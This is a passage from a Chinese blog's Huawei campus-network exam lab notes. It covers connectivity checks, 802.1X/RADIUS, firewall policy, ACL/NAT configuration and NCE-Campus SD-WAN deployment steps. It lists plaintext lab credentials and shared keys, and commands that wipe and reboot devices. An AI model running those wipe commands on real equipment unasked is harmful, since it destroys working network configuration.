1 10.2.21.79 <span class="hljs-comment"># 不通</span>ping -w 1 10.100.2.1 <span class="hljs-comment"># 通</span>ping -w 1 10.255.5.254 <span class="hljs-comment"># 通</span>ping -w 1 10.3.99.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.3.100.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.3.101.254 <span class="hljs-comment"># 通</span><span class="hljs-comment"># 2 Terminal 04</span>ipconfig <span class="hljs-comment"># 10.2.21.x</span>ping -w 1 10.100.3.1 <span class="hljs-comment"># 通</span>ping -w 1 10.3.99.254 <span class="hljs-comment"># 通</span>ping -w 1 10.3.100.254 <span class="hljs-comment"># 通</span>ping -w 1 10.3.101.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.2.110.149 <span class="hljs-comment"># 不通</span><span class="hljs-comment"># 3 Terminal 05</span><span class="hljs-comment"># 网站认证：empl1/Huawei@123</span>ipconfig <span class="hljs-comment"># 10.2.55.x</span>ping -w 1 10.255.5.254<span class="hljs-comment"># 网站认证：guest/Huawei@123</span>ipconfig <span class="hljs-comment"># 10.2.110.x</span>ping -w 1 10.255.5.254 <span class="hljs-comment"># 通 本地local</span>ping -w 1 10.3.99.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.3.100.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.3.101.254 <span class="hljs-comment"># 不通</span><span class="hljs-comment"># 4 Y_export</span>display ospf peer brief<span class="hljs-comment"># 5 Sotre_Export1</span>tracert -vpn-instance vpn2 -a 10.100.2.1 10.255.5.254 <span class="hljs-comment"># 通</span>tracert -vpn-instance vpn4 -a 10.100.4.1 10.255.5.254 <span class="hljs-comment"># 通</span><span class="hljs-comment"># 6. NCE</span>1. 准入/准入策略/用户在线控制/在线用户Z园区<span class="hljs-comment"># X_T1_Export1</span>tracert -a 10.20.1.5 10.100.2.1 <span class="hljs-comment"># 通</span><span class="hljs-comment"># X_T1_Export2</span>tracert -a 10.20.1.6 10.100.2.1 <span class="hljs-comment"># 通</span><span class="hljs-comment"># Store_Export1</span>ping -vpn-instance vpn3 -a 10.100.3.1 10.3.99.254ping -vpn-instance vpn3 -a 10.100.3.1 10.3.100.254<span class="hljs-comment"># X/Y/Z_PE1/2</span>display current-configuration interfacedisplay mpls lspdisplay isis peerdisplay current-configuration configuration isisdisplay current-configuration configuration bgpdisplay bgp vpnv4 all peer<span class="hljs-comment"># X_PE1</span>display ip routing-table vpn-instance OA 10.3.101.0 24 verbosedisplay ip routing-table 5.0.0.5 verbosetracert -a 1.0.0.1 5.0.0.5int g 0/0/1 &amp; shutdown &amp; tracert -a 1.0.0.1 5.0.0.5 &amp; undo shutdown<span class="hljs-comment"># Y_PE1</span>display ip routing-table vpn-instance OA 10.3.101.0 24 verbosedisplay ip routing-table vpn-instance R&amp;D 10.3.100.0 24 verbosedisplay ip routing-table vpn-instance R&amp;D 10.3.99.0 24 verbose<span class="hljs-comment"># Z_PE1</span>display ip routing-table vpn-instance OA_Indisplay ip routing-table vpn-instance OA_Out<span class="hljs-comment"># Z_PE2</span>display ip vpn-instance verbosedisplay ip routing-table vpn-instance OA_Indisplay ip routing-table vpn-instance OA_Out<span class="hljs-comment"># Z_Export1</span>display ip routing-table vpn-instance OAdisplay ip routing-table vpn-instance R&amp;D其他常用命令与技巧检查命令<span class="hljs-comment"># 保持ssh会话</span>sysuser-interface console 0idle-timeout 0 0<span class="hljs-comment"># 关闭日志</span>undo info-center <span class="hljs-built_in">enable</span><span class="hljs-comment"># lldp</span>system-viewlldp <span class="hljs-built_in">enable</span>display lldp neighbor brief<span class="hljs-comment"># 查看 IP 地址池</span>display current-configuration configuration ip-pool<span class="hljs-comment"># </span>display ip interface brief<span class="hljs-comment">#</span>display port vlan<span class="hljs-comment">#</span>dis lldp neighbor brief<span class="hljs-comment"># </span>dis cur | include prefix&gt; <span class="hljs-comment"># 清除配置，重启生效</span>reset saved-configuration<span class="hljs-comment"># 查看VPN实例</span>dis cur config vpn-instance快捷键CTRL+X 删除光标左侧所有的字符CTRL+Y 删除光标所在位置及其右侧所有的字符CTRL+E 将光标移动到当前行的末尾CTRL+A 将光标移动到当前行的第一个字符CTRL+W 删除光标左侧的一个字<span class="hljs-comment"># 组合键</span>ESC+B 将光标向左移动一个字符串ESC+D 删除光标右侧的一个字符串<span class="hljs-comment"># 不常用</span>ESC+F 将光标向右移动一个字符串CTRL+B 将光标向左移动一个字符CTRL+F 将光标向右移动一个字符CTRL+D 删除当前光标所在位置的字符CTRL+H 删除光标左侧的一个字符CTRL+N 显示历史命令缓冲区中的后一条命令CTRL+P 显示历史命令缓冲区中的前一条命令排查命令display  ospf 65001 errordis cu configuration  ospf  65001转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 hjxstart@126.com中华人民共和国工业和信息化部 粤ICP备2021170625号-1 ©2019-2022 hjxstartBuilt with Hexo and 3-hexo theme</code></pre><h3 id="4-1-配置-无线-802-1X-认证-AP-强制不认证"><a href="#4-1-配置-无线-802-1X-认证-AP-强制不认证" class="headerlink" title="4.1 配置 无线 &#x2F; 802.1X 认证 &#x2F; AP 强制不认证"></a>4.1 配置 无线 &#x2F; 802.1X 认证 &#x2F; AP 强制不认证</h3><h3 id="4-2-配置-802-1X-MAC-接入模版，并绑定到身份认证模版中"><a href="#4-2-配置-802-1X-MAC-接入模版，并绑定到身份认证模版中" class="headerlink" title="4.2 配置 802.1X &#x2F; MAC 接入模版，并绑定到身份认证模版中"></a>4.2 配置 802.1X &#x2F; MAC 接入模版，并绑定到身份认证模版中</h3><h3 id="4-3-在汇聚设备的相应端口上开启认证模版"><a href="#4-3-在汇聚设备的相应端口上开启认证模版" class="headerlink" title="4.3 在汇聚设备的相应端口上开启认证模版"></a>4.3 在汇聚设备的相应端口上开启认证模版</h3><pre><code class="hljs bash"><span class="hljs-comment"># X_T1_AC</span>vlan pool wireless_Employee  vlan 51 to 55  assignment <span class="hljs-built_in">hash</span>vlan pool wireless_Guest  vlan 101 to 105  assignment <span class="hljs-built_in">hash</span>wlan  ssid-profile name Guest    ssid X_Guest010    y  ssid-profile name Employee    ssid X_Employee010    y  vap-profile name Employee    service-vlan vlan-pool wireless_Employee    y  vap-profile name Guest    service-vlan vlan-pool wireless_Guest    y  ap-id 1 ap-mac 00e0-fca9-6ac0    ap-name X_T2_AP    ap-group X    y<span class="hljs-comment"># X_T_ACC1/ACC2 </span>l2protocol-tunnel user-defined-protocol 802.1X protocol-mac 0180-c200-0003 group-mac  0100-0000-0002port-group group-number GigabitEthernet 0/0/1 to GigabitEthernet 0/0/22  l2protocol-tunnel user-defined-protocol 802.1X <span class="hljs-built_in">enable</span>interface Eth-trunk 1  l2protocol-tunnel user-defined-protocol 802.1X <span class="hljs-built_in">enable</span><span class="hljs-comment"># X_T_AGG1</span>radius-server template Employee  radius-server authentication 10.1.60.2 1812  radius-server accounting 10.1.60.2 1813  radius-server shared-key cipher Huawei@123radius authorization 10.1.60.2 shared-key cipher Huawei@123aaa  authentication-scheme Employee    authentication-mode radius  authentication-scheme ap_noauthen    authentication-mode none  accounting-scheme Employee    accounting-mode radius  domain Employee    authentication-scheme Employee    accounting-scheme Employee    radius-server Employee  domain ap_noauthen    authenticaton-scheme ap_noauthendomain Employee<span class="hljs-comment"># X_T1_AGG1</span><span class="hljs-comment"># 模拟器不用敲</span>domain ap_noauthen mac-authentication force mac-address 00e0-fcb7-2890 mask ffff-ffff-ffff<span class="hljs-comment"># X_T2_AGG1</span>domain ap_noauthen mac-authentication force mac-address 00e0-fca9-6ac0 mask ffff-ffff-ffff<span class="hljs-comment"># X_T1/2_AGG1 </span>dot1x-access-profile name Employeemac-access-profile name Employeeauthentication-profile name Employee  dot1x-access-profile Employee  mac-access-profile Employeeinterface Eth-trunk 2  authentication-profile Employeeinterface Eth-trunk 3  authentication-profile Employee<span class="hljs-comment"># X_T1_AGG1 </span>vlan pool market  vlan 11 to 15vlan pool procure  vlan 21 to 25<span class="hljs-comment"># X_T2_AGG1</span>vlan pool finance  vlan 31 to 35vlan pool hr  vlan 41 to 45</code></pre><h3 id="5-配置-FW-策略"><a href="#5-配置-FW-策略" class="headerlink" title="5. 配置 FW 策略"></a>5. 配置 FW 策略</h3><pre><code class="hljs bash"><span class="hljs-comment"># X_T1_FW</span>ip route-static vpn-instance Guest 10.1.60.99 32 vpn-instance Employeeswitch vsys Guest  sys    ip service-set Guest_Service <span class="hljs-built_in">type</span> object      service protocol tcp source-port 0 to 65535 destination-port 3389    security-policy      rule name Guest_Service //外部无线用户访问HTTP 服务3389        source-zone trust        destination-zone untrust        source-address range 10.1.101.0 10.1.105.255        destination-address 10.1.60.99 mask 255.255.255.255        service Guest_Service        action permit      rule name Deny_Servcie        source-zone trust        destination-zone untrust        source-address range 10.1.101.0 10.1.105.255        destination-address 10.1.60.0 mask 255.255.255.0        action deny      rule name Guest_Internet //访问Internet 的策略最后配置        source-zone trust        destination-zone untrust        source-address range 10.1.101.0 10.1.105.255        destination-address any        action permitswitch vsys Employee  sys    ip service-set Guest_Service <span class="hljs-built_in">type</span> object      service protocol tcp source-port 0 to 65535 destination-port 3389    security-policy      rule name Guest_Service //放行Guest 到服务器区域的流量        source-zone untrust        destination-zone trust        source-address range 10.1.101.0 10.1.105.255        destination-address 10.1.60.99 mask 255.255.255.255        service Guest_Service        action permit      rule name Employee_Service //内部无线访问服务器        source-zone trust        destination-zone trust        source-address 10.1.51.0 10.1.55.255        destination-address 10.1.60.100 mask 255.255.255.255        action permit      rule name Deny_Service        source-zone trust        destination-zone trust        source-address range 10.1.51.0 10.1.55.255        destination-address 10.1.60.0 mask 255.255.255.0        action deny      rule name NAT_http_Service //放行NAT_Service 流量        source-zone untrust        destination-zone trust        source-address any        destination-address 10.1.60.101 mask 255.255.255.255        service http        action permit      rule name Employee_to_Internet //访问Internet 的策略最后配置        source-zone trust        destination-zone untrust        source-address range 10.1.11.0 10.1.15.255        source-address range 10.1.21.0 10.1.25.255        source-address range 10.1.51.0 10.1.55.255        action permit</code></pre><h3 id="6-ACL-NAT-Traffic"><a href="#6-ACL-NAT-Traffic" class="headerlink" title="6. ACL &#x2F; NAT &#x2F; Traffic"></a>6. ACL &#x2F; NAT &#x2F; Traffic</h3><pre><code class="hljs bash"><span class="hljs-comment">## X_T1_CORE</span><span class="hljs-comment"># 模拟器不用敲</span>acl 3000   rule permit ip <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255 destination 10.1.60.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 destination 10.1.60.0 0.0.0.255<span class="hljs-comment"># 连接AC 的物理口,记住即可，无法配置 拟器不用敲</span>interface g0/0/3   traffic-redirect inbound acl 3000 vpn-instance Employee ip-nexthop 10.1.200.22<span class="hljs-comment">#</span>acl number 3001  rule permit tcp <span class="hljs-built_in">source</span> 10.1.60.101 0.0.0.0 source-port eq 80 destination anyinterface GigabitEthernet 0/0/4  traffic-redirect inbound acl 3001 ip-nexthop 10.1.200.5<span class="hljs-comment">## X_T_Export1</span>acl 2000  udno rule 5  rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.101.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.102.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.103.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.104.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.105.0 0.0.0.255<span class="hljs-comment">## X_T_Export2</span>acl 2000   rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.101.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.102.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.103.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.104.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.105.0 0.0.0.255nat address-group 1 10.255.4.2 10.255.4.100 interface GigabitEthernet 0/0/0  nat outbound 2000interface GigabitEthernet 0/0/2  nat outbound 2000 address-group 1  nat server protocol tcp global current-interface 8081 inside 10.1.60.101 wwwwacl number 3001  rule permit tcp <span class="hljs-built_in">source</span> 10.1.60.101 0.0.0.0 source-port eq 80 destination anytraffic classifier web  if-match acl 3001traffic behavior web  redirect ip-nexthop 10.255.4.254traffic policy web  classifier web behavior webinterface GigabitEthernet 0/0/1  traffic-policy web inbound</code></pre><h3 id="7-测试"><a href="#7-测试" class="headerlink" title="7. 测试"></a>7. 测试</h3><pre><code class="hljs bash"><span class="hljs-comment"># X_T1_ACC2</span>interface GigabitEthernet 0/0/1  port hybrid untagged vlan 24  port hybrid pvid vlan 24<span class="hljs-comment"># X_T2_ACC1</span>interface GigabitEthernet 0/0/1  port hybrid untagged vlan 33  port hybrid pvid vlan 33<span class="hljs-comment"># 使用 STA 设备连接到T1 X_Guest010 WIFI</span>ping 10.255.1.254ping 10.1.60.99 [不通]<span class="hljs-comment"># 使用 STA 设备连接到T2 X_Employee010 WIFI</span>ping 10.255.1.254ping 10.1.60.100<span class="hljs-comment"># Terminal01测试</span>ping 10.255.1.254ping 10.1.60.100ping 10.1.60.99<span class="hljs-comment"># Terminal02测试</span>ping 10.1.60.100ping 10.255.1.254 [不通]<span class="hljs-comment"># X_T1_AC</span>interface GigabitEthernet 0/0/2  port hybrid untagged vlan 103  port hybrid pvid vlan 103<span class="hljs-comment"># 60.99 模拟终端</span>sys  telnet server <span class="hljs-built_in">enable</span>  telnet server port 3389<span class="hljs-comment"># 模拟Guest</span>telnet 10.1.60.99 3389</code></pre><hr><h2 id="Y园区：iMaster-NCE-Campus-SD-WAN-部署"><a href="#Y园区：iMaster-NCE-Campus-SD-WAN-部署" class="headerlink" title="Y园区：iMaster NCE-Campus SD-WAN 部署"></a>Y园区：iMaster NCE-Campus SD-WAN 部署</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>OSPF &#x2F; BGP 65003 &#x2F; VXLAN</p><h3 id="NCE-纳管设备"><a href="#NCE-纳管设备" class="headerlink" title="NCE 纳管设备"></a>NCE 纳管设备</h3><h4 id="0-环境信息"><a href="#0-环境信息" class="headerlink" title="0 - 环境信息"></a>0 - 环境信息</h4><pre><code class="hljs bash"><span class="hljs-comment"># 考试环境</span>NCE-Web地址: 172.22.8.71/171NCE-南向地址: 172.22.8.72/172<span class="hljs-comment"># FZ-Rack</span>NCE-Web地址: 172.22.8.71NCE-南向地址: 172.22.8.72快照地址(FC界面): 192.168.10.110<span class="hljs-comment"># NJ-Rack</span>NCE-Web地址: 172.22.8.70NCE-南向地址: 172.22.8.71快照地址(FC界面): 10.1.10.21<span class="hljs-comment"># FZMN-Rack</span>NCE-Web地址: 172.22.8.172<span class="hljs-comment"># NJMN-Rack</span>NCE-Web地址: 172.22.8.81NCE-南向地址: 172.22.8.82快照地址(FC界面): 192.168.130.22user001/Huawei@123<span class="hljs-comment"># 设备清空</span><span class="hljs-comment"># 路由器设备清空&gt; reset saved-configuration</span><span class="hljs-comment"># 路由器设备清空&gt; reboot fast</span><span class="hljs-comment"># 交换机设备清空# reset netconf db-configureation </span></code></pre><h4 id="1-切换-EVPN-网络隧道模式"><a href="#1-切换-EVPN-网络隧道模式" class="headerlink" title="1 - 切换 EVPN 网络隧道模式"></a>1 - 切换 EVPN 网络隧道模式</h4><blockquote><p>设计 &#x2F; 基础网络设计 &#x2F; 网络设置 &#x2F; 隧道模式 &#x2F; EVPN</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072242664.png" alt="切换EVPN"></p><h4 id="2-关闭-物理网络-开局邮件加密"><a href="#2-关闭-物理网络-开局邮件加密" class="headerlink" title="2 - 关闭 物理网络 开局邮件加密"></a>2 - 关闭 物理网络 开局邮件加密</h4><blockquote><p>多分支互联 &#x2F; 全局配置 &#x2F; 物理网络 &#x2F; 设备激活安全配置 &#x2F; 加密使能</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072310821.png" alt="多分支互联"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072311085.png" alt="关闭加密使能"></p><h4 id="3-确定-BGP-AS-65003-IP地址池-10-99-0-0-16"><a href="#3-确定-BGP-AS-65003-IP地址池-10-99-0-0-16" class="headerlink" title="3 - 确定 BGP AS 65003 &amp; IP地址池 10.99.0.0&#x2F;16"></a>3 - 确定 BGP AS 65003 &amp; IP地址池 10.99.0.0&#x2F;16</h4><blockquote><p>多分支互联 &#x2F; 全局配置 &#x2F; 虚拟网络 &#x2F; 路由 &amp; IP地址池</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072314337.png"></p><h4 id="4-创建-Site-Y-Site-Store1"><a href="#4-创建-Site-Y-Site-Store1" class="headerlink" title="4 - 创建 Site_Y &amp; Site_Store1"></a>4 - 创建 Site_Y &amp; Site_Store1</h4><blockquote><p>多分支互联 &#x2F; 站点设置 &#x2F; 创建 &#x2F; Site_Y 和 Store 站点</p></blockquote><blockquote><p>Site_Y&#x2F;Site_Store1: 勾选 AR &#x2F; LSW &#x2F; WAC </p></blockquote><blockquote><p>参数说明: WAC – 随绑&#x2F;带AC的交换机; AP – 云AP</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072330132.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072337235.png"></p><h4 id="5-添加设备"><a href="#5-添加设备" class="headerlink" title="5 - 添加设备"></a>5 - 添加设备</h4><blockquote><p>多分支互联 &#x2F; 设备管理 &#x2F; 添加设备 &#x2F; 批量导入 &#x2F; 选择对应的设备exce模版 &#x2F; 开始导入 &#x2F; 确定 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072341966.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412072348298.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412081944889.png"></p><h4 id="6-创建-WAN链路模版"><a href="#6-创建-WAN链路模版" class="headerlink" title="6 - 创建 WAN链路模版"></a>6 - 创建 WAN链路模版</h4><blockquote><p>多分支互联 &#x2F; WAN链路模版</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102013430.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102015140.png"></p><h4 id="7-零配置开局-路由器托管配置-手动配置和自动配置"><a href="#7-零配置开局-路由器托管配置-手动配置和自动配置" class="headerlink" title="7 - 零配置开局 路由器托管配置(手动配置和自动配置)"></a>7 - 零配置开局 路由器托管配置(手动配置和自动配置)</h4><blockquote><p>多分支互联 &#x2F; 零配置开局 &#x2F; 点击开局 &#x2F; 站点 &#x2F; DHCP Option &#x2F; 模版导入 &#x2F; 配置地址 &#x2F; 接口编号 IP GW Mb&#x2F;s</p></blockquote><blockquote><p>多分支互联 &#x2F; WAN Underlay &#x2F; WALN路由（静态路由）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102018682.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102020715.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102022854.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102026251.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102028881.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102030112.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102032745.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102034294.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102035767.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102037603.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102038464.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102040901.png"></p><blockquote><p>配置静态路由和NAT</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102044754.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102046134.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102048906.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102052530.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102053016.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102054984.png"></p><h4 id="8-站点间组网-RR反射器"><a href="#8-站点间组网-RR反射器" class="headerlink" title="8 - 站点间组网 RR反射器"></a>8 - 站点间组网 RR反射器</h4><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102056687.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102058715.png"></p><h4 id="9-交换机托管配置-并部署-Management-VN"><a href="#9-交换机托管配置-并部署-Management-VN" class="headerlink" title="9 - 交换机托管配置 并部署 Management VN"></a>9 - 交换机托管配置 并部署 Management VN</h4><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102059799.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102103238.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102104429.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102106086.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102108467.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102109553.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102112340.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102115336.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102117586.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102120939.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102122480.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102123930.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102126558.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102129475.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102131405.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102133799.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102135787.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102138841.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102139409.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412102140063.png"></p><p>91’ Y_Core -&gt; web -&gt; 配置 -&gt; 无线业务管理 -&gt; vlan 3996 -&gt; 应用</p><h4 id="10-纳管检查"><a href="#10-纳管检查" class="headerlink" title="10 - 纳管检查"></a>10 - 纳管检查</h4><h3 id="Fabric-池-资源网络"><a href="#Fabric-池-资源网络" class="headerlink" title="Fabric(池)资源网络"></a>Fabric(池)资源网络</h3><p>1 - Fabric网络规划</p><blockquote><p>配置IGP 协议的地址和VLAN 创建Radius服务 Rrotal认证服务器 802.1X认证模版</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112030554.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112032637.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112034354.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112036282.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112037587.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112039707.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112041526.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112043877.png"></p><p>3 - 创建Fabric网络</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112048179.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112050027.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412112051232.png"></p><p>4 - 配置网络中的设备角色（边缘节点和边界网关节点）</p><p>5 - 添加DHCP服务器</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122051422.png"></p><p>6 - 创建 OA&#x2F;R&amp;D 业务网络的L3独占外部接口</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122054734.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122057959.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122058484.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122100497.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122101360.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122104394.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122106691.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122108089.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122110576.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122111108.png"></p><p>7 - 创建 Guest 业务三层出口</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122113225.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122114236.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122116069.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122117638.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122120590.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122125912.png"></p><p>8 - 配置Y_AGG和Y_ACC的接入认证</p><p>9 - 执行点配置</p><p>10 - 创建LAN侧VN（地址池）</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122127055.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122128166.png"><br><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202412122129703.png"><br><img 